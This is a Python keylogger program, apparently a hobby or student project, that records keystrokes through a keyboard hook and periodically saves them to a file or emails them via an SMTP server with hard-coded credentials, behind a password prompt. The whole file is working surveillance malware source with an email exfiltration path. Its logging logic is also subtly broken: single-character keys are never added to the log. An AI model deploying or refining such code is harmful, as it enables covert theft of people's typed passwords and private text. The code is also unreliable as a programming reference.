import keyboard 
import smtplib
#email library
from threading import Timer 
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import hashlib

SEND_REPORT_EVERY = 90 # email send interval in seconds
EMAIL_ADDRESS = "email@dogpile.com"# email account you want to use
EMAIL_PASSWORD = "Hello world" # account pswd

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " " # quotations instead of space
            elif name == "enter":
                name = "[ENTER]\n" # add a new line when enter is pressed
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_") #replace any spaces with underscores
                name = f"[{name.upper()}]"
                #add key name to the self.log
            self.log += name
            
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
        # build filename identified by start and end times
        
    def report_to_file(self): #open file in write mode
        with open(f"{self.filename}.txt", "w") as f: # write the keystroke logs to the file
            print (self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
        
    def prepare_mail(self, message): #creating the email
        msg = MIMEMultipart("alternative")
        msg["From"]= EMAIL_ADDRESS #from line in email window
        msg["To"] = EMAIL_ADDRESS # to line in email window
        msg["Subject"] = "Keylog" # message subject line
        html = f"<p>{message}</p>" # message paragraph for content
        text_part = MIMEText(message, "plain") #text and html content within the message
        html_part = MIMEText(html, "html")
        msg.attach(text_part) #attaching the text file version of the keylog
        msg.attach(html_part)# attaching the html version of the keylog
        return msg.as_string()
    
    def sendmail(self, email, password, message, verbose=1):
        server = smtplib.SMTP(host="smtp.live.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email,self.prepare_mail(message))
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing: {message}")
            
    def report(self):
        if self.log: #if there is somethin gin the log then report it. 
            self.end_dt = datetime.now()# update the self.filename
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method =="file":
                self.report_to_file()
                print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log =""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
        
    def start(self):
        self.start_dt = datetime.now() #record the start date and time
        keyboard.on_release(callback=self.callback) #start the keylogger
        self.report() #making the message
        print(f"{datetime.now()} - Started keylogger") #block the thread and wait for user input of CTRL C
        keyboard.wait()
              
def passwordCheck(): # Requests user for password and validates it
    userInput = input("Please enter a password: ").encode() # User enters a password and encodes it into bytes
    userInputHash = hashlib.sha3_256(userInput).hexdigest() # Converts userInput to a hash
    if(userInputHash == "5329091ef26383d2d686ee2afcc529eee90e47e3a4ef7cb2e1c4b7d0f20eb965"): # Compare hashes 
       return True
    else:
       return False
        
if __name__ == "__main__":
    yayOrNay = passwordCheck() # Password check  
    if(yayOrNay == True):      # If Password is correct, runs Keylogger     
        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
        keylogger.start()
    else: # If password is incorrect, sends a message
        print("The password you have entered is incorrect.\nGoodbye.")

